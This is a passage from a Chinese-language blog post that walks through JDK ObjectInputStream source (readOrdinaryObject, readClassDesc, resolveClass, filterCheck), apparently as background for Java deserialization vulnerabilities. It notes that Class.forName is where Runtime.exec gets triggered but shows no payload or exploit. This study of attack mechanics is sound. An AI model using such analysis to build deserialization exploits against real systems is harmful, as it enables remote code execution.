class="keyword">new</span> OptionalDataException(</span><br><span class="line">                        bin.currentBlockRemaining());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">                        <span class="string">"unexpected block data"</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENDBLOCKDATA:</span><br><span class="line">                <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> OptionalDataException(<span class="keyword">true</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">                        <span class="string">"unexpected end of block data"</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">                    String.format(<span class="string">"invalid type code: %02X"</span>, tc));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        depth--;</span><br><span class="line">        bin.setBlockDataMode(oldMode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里匹配到这里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> TC_OBJECT:</span><br><span class="line">      <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br></pre></td></tr></table></figure><h3 id="readOrdinaryObject"><a href="#readOrdinaryObject" class="headerlink" title="readOrdinaryObject"></a>readOrdinaryObject</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Reads and returns "ordinary" (i.e., not a String, Class,</span></span><br><span class="line"><span class="comment"> * ObjectStreamClass, array, or enum constant) object, or null if object's</span></span><br><span class="line"><span class="comment"> * class is unresolvable (in which case a ClassNotFoundException will be</span></span><br><span class="line"><span class="comment"> * associated with object's handle).  Sets passHandle to object's assigned</span></span><br><span class="line"><span class="comment"> * handle.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readOrdinaryObject</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//首先再次确认TC_OBJECT，不是的话直接报错</span></span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_OBJECT) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//读取当前类的类描述符号</span></span><br><span class="line">    ObjectStreamClass desc = readClassDesc(<span class="keyword">false</span>);</span><br><span class="line">  <span class="comment">//检查是否可以反序列化</span></span><br><span class="line">    desc.checkDeserialize();</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl == String<span class="class">.<span class="keyword">class</span> || <span class="title">cl</span> </span>== Class<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">            || <span class="title">cl</span> </span>== ObjectStreamClass<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(<span class="string">"invalid class descriptor"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object obj;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        obj = desc.isInstantiable() ? desc.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">            desc.forClass().getName(),</span><br><span class="line">            <span class="string">"unable to create instance"</span>).initCause(ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    passHandle = handles.assign(unshared ? unsharedMarker : obj);</span><br><span class="line">    ClassNotFoundException resolveEx = desc.getResolveException();</span><br><span class="line">    <span class="keyword">if</span> (resolveEx != <span class="keyword">null</span>) &#123;</span><br><span class="line">        handles.markException(passHandle, resolveEx);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (desc.isExternalizable()) &#123;</span><br><span class="line">        readExternalData((Externalizable) obj, desc);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        readSerialData(obj, desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handles.finish(passHandle);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">        handles.lookupException(passHandle) == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">        desc.hasReadResolveMethod())</span><br><span class="line">    &#123;</span><br><span class="line">        Object rep = desc.invokeReadResolve(obj);</span><br><span class="line">        <span class="keyword">if</span> (unshared &amp;&amp; rep.getClass().isArray()) &#123;</span><br><span class="line">            rep = cloneArray(rep);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (rep != obj) &#123;</span><br><span class="line">            <span class="comment">// Filter the replacement object</span></span><br><span class="line">            <span class="keyword">if</span> (rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (rep.getClass().isArray()) &#123;</span><br><span class="line">                    filterCheck(rep.getClass(), Array.getLength(rep));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filterCheck(rep.getClass(), -<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            handles.setObject(passHandle, obj = rep);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从<code>ObjectStreamClass desc = readClassDesc(false);</code>这句进入<code>readClassDesc</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ObjectStreamClass <span class="title">readClassDesc</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">byte</span> tc = bin.peekByte();</span><br><span class="line">    ObjectStreamClass descriptor;</span><br><span class="line">    <span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">        <span class="keyword">case</span> TC_NULL:</span><br><span class="line">            descriptor = (ObjectStreamClass) readNull();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">            descriptor = (ObjectStreamClass) readHandle(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">            descriptor = readProxyDesc(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">            descriptor = readNonProxyDesc(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">                String.format(<span class="string">"invalid type code: %02X"</span>, tc));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> descriptor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>readClassDesc</code>读取类描述符，所以进入<code>case TC_CLASSDESC : readNonProxyDesc</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Reads in and returns class descriptor for a class that is not a dynamic</span></span><br><span class="line"><span class="comment"> * proxy class.  Sets passHandle to class descriptor's assigned handle.  If</span></span><br><span class="line"><span class="comment"> * class descriptor cannot be resolved to a class in the local VM, a</span></span><br><span class="line"><span class="comment"> * ClassNotFoundException is associated with the descriptor's handle.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> ObjectStreamClass <span class="title">readNonProxyDesc</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_CLASSDESC) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ObjectStreamClass desc = <span class="keyword">new</span> ObjectStreamClass();</span><br><span class="line">    <span class="keyword">int</span> descHandle = handles.assign(unshared ? unsharedMarker : desc);</span><br><span class="line">    passHandle = NULL_HANDLE;</span><br><span class="line"></span><br><span class="line">    ObjectStreamClass readDesc = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        readDesc = readClassDescriptor();<span class="comment">//进入</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">            <span class="string">"failed to read class descriptor"</span>).initCause(ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; cl = <span class="keyword">null</span>;</span><br><span class="line">    ClassNotFoundException resolveEx = <span class="keyword">null</span>;</span><br><span class="line">    bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">boolean</span> checksRequired = isCustomSubclass();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((cl = resolveClass(readDesc)) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            resolveEx = <span class="keyword">new</span> ClassNotFoundException(<span class="string">"null class"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (checksRequired) &#123;</span><br><span class="line">            ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        resolveEx = ex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call filterCheck on the class before reading anything else</span></span><br><span class="line">    filterCheck(cl, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    skipCustomData();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        totalObjectRefs++;</span><br><span class="line">        depth++;</span><br><span class="line">        desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(<span class="keyword">false</span>));</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        depth--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handles.finish(descHandle);</span><br><span class="line">    passHandle = descHandle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> desc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着进入到<code>readClassDescriptor</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> ObjectStreamClass <span class="title">readClassDescriptor</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ObjectStreamClass desc = <span class="keyword">new</span> ObjectStreamClass();</span><br><span class="line">    desc.readNonProxy(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> desc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入<code>readNonProxy</code>，读取desc对应的元数据信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readNonProxy</span><span class="params">(ObjectInputStream in)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 类名</span></span><br><span class="line">    name = in.readUTF();</span><br><span class="line">    <span class="comment">// serialVersionUID</span></span><br><span class="line">    suid = Long.valueOf(in.readLong());</span><br><span class="line">    isProxy = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span> flags = in.readByte();</span><br><span class="line">    hasWriteObjectData =</span><br><span class="line">        ((flags &amp; ObjectStreamConstants.SC_WRITE_METHOD) != <span class="number">0</span>);</span><br><span class="line">    hasBlockExternalData =</span><br><span class="line">        ((flags &amp; ObjectStreamConstants.SC_BLOCK_DATA) != <span class="number">0</span>);</span><br><span class="line">    externalizable =</span><br><span class="line">        ((flags &amp; ObjectStreamConstants.SC_EXTERNALIZABLE) != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">boolean</span> sflag =</span><br><span class="line">        ((flags &amp; ObjectStreamConstants.SC_SERIALIZABLE) != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (externalizable &amp;&amp; sflag) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">            name, <span class="string">"serializable and externalizable flags conflict"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    serializable = externalizable || sflag;</span><br><span class="line">    isEnum = ((flags &amp; ObjectStreamConstants.SC_ENUM) != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (isEnum &amp;&amp; suid.longValue() != <span class="number">0L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(name,</span><br><span class="line">            <span class="string">"enum descriptor has non-zero serialVersionUID: "</span> + suid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> numFields = in.readShort();</span><br><span class="line">    <span class="keyword">if</span> (isEnum &amp;&amp; numFields != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(name,</span><br><span class="line">            <span class="string">"enum descriptor has non-zero field count: "</span> + numFields);</span><br><span class="line">    &#125;</span><br><span class="line">    fields = (numFields &gt; <span class="number">0</span>) ?</span><br><span class="line">        <span class="keyword">new</span> ObjectStreamField[numFields] : NO_FIELDS;</span><br><span class="line">  <span class="comment">// 从字节流中读取每一个字段的信息</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numFields; i++) &#123;</span><br><span class="line">        <span class="keyword">char</span> tcode = (<span class="keyword">char</span>) in.readByte();</span><br><span class="line">        String fname = in.readUTF();</span><br><span class="line">        String signature = ((tcode == <span class="string">'L'</span>) || (tcode == <span class="string">'['</span>)) ?</span><br><span class="line">            in.readTypeString() : <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">char</span>[] &#123; tcode &#125;);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fields[i] = <span class="keyword">new</span> ObjectStreamField(fname, signature, <span class="keyword">false</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidClassException(name,</span><br><span class="line">                <span class="string">"invalid descriptor for field "</span> + fname).initCause(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    computeFieldOffsets();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fields其实是类中每个字段的信息，包括：字段名称，字段类型，字段代码。</p><p>序列化操作中，在<code>writeNonProxy</code>中写入的<code>TypeCode</code>、<code>fieldName</code>、<code>fieldType</code>在这里被读取。</p><p>之后会回到这里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">readNonProxyDesc&#123;</span><br><span class="line">  ...</span><br><span class="line">ObjectStreamClass readDesc = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        readDesc = readClassDescriptor();<span class="comment">//进入-继续</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">            <span class="string">"failed to read class descriptor"</span>).initCause(ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; cl = <span class="keyword">null</span>;</span><br><span class="line">    ClassNotFoundException resolveEx = <span class="keyword">null</span>;</span><br><span class="line">    bin.setBlockDataMode(<span class="keyword">true</span>);<span class="comment">//开启data-block模式</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">boolean</span> checksRequired = isCustomSubclass();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((cl = resolveClass(readDesc)) == <span class="keyword">null</span>) &#123;<span class="comment">//进入</span></span><br><span class="line">            resolveEx = <span class="keyword">new</span> ClassNotFoundException(<span class="string">"null class"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (checksRequired) &#123;</span><br><span class="line">            ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        resolveEx = ex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call filterCheck on the class before reading anything else</span></span><br><span class="line">    filterCheck(cl, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    skipCustomData();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        totalObjectRefs++;</span><br><span class="line">        depth++;</span><br><span class="line">        desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(<span class="keyword">false</span>));</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        depth--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handles.finish(descHandle);</span><br><span class="line">    passHandle = descHandle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> desc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入<code>resolveClass</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    String name = desc.getName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Class.forName(name, <span class="keyword">false</span>, latestUserDefinedLoader());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看到<code>Class.forName()</code>操作，会尝试加载本地类。</p><p>其实就是反序列化的根本原因，Runtime类在这里被加载，执行了exec()</p><blockquote><p>序列化操作中，oos的<code>annotateClass</code>、<code>annotateProxyClass</code>和<code>replaceObject</code>方法 </p><p>反序列化操作中对应<code>resolveClass</code>、<code>resolveProxyClass</code>、<code>resolveObject</code>方法</p></blockquote><p>执行结束之后该进入<code>filterCheck(cl, -1);</code> ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">filterCheck</span><span class="params">(Class&lt;?&gt; clazz, <span class="keyword">int</span> arrayLength)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> InvalidClassException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (serialFilter != <span class="keyword">null</span>) &#123;</span><br><span class="line">        RuntimeException ex = <span class="keyword">null</span>;</span><br><span class="line">        ObjectInputFilter.Status status;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            status = serialFilter.checkInput(<span class="keyword">new</span> FilterValues(clazz, arrayLength,</span><br><span class="line">                    totalObjectRefs, depth, bin.getBytesRead()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            <span class="comment">// Preventive interception of an exception to log</span></span><br><span class="line">            status = ObjectInputFilter.Status.REJECTED;</span><br><span class="line">            ex = e;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (status == <span class="keyword">null</span>  ||</span><br><span class="line">                status == ObjectInputFilter.Status.REJECTED) &#123;</span><br><span class="line">            <span class="comment">// Debug logging of filter checks that fail</span></span><br><span class="line">            <span class="keyword">if</span> (Logging.infoLogger != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Logging.infoLogger.info(</span><br><span class="line">                        <span class="string">"ObjectInputFilter &#123;0&#125;: &#123;1&#125;, array length: &#123;2&#125;, nRefs: &#123;3&#125;, depth: &#123;4&#125;, bytes: &#123;5&#125;, ex: &#123;6&#125;"</span>,</span><br><span class="line">                        status, clazz, arrayLength, totalObjectRefs, depth, bin.getBytesRead(),</span><br><span class="line">                        Objects.toString(ex, <span class="string">"n/a"</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            InvalidClassException ice = <span class="keyword">new</span> InvalidClassException(<span class="string">"filter status: "</span> + status);</span><br><span class="line">            ice.initCause(ex);</span><br><span class="line">            <span class="keyword">throw</span> ice;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Trace logging for those that succeed</span></span><br><span class="line">            <span class="keyword">if</span> (Logging.traceLogger != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Logging.traceLogger.finer(</span><br><span class="line">                        <span class="string">"ObjectInputFilter &#123;0&#125;: &#123;1&#125;, array length: &#123;2&#125;, nRefs: &#123;3&#125;, depth: &#123;4&#125;, bytes: &#123;5&#125;, ex: &#123;6&#125;"</span>,</span><br><span class="line">                        status, clazz, arrayLength, totalObjectRefs, depth, bin.getBytesRead(),</span><br><span class="line">                        Objects.toString(ex, <span class="string">"n/a"</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        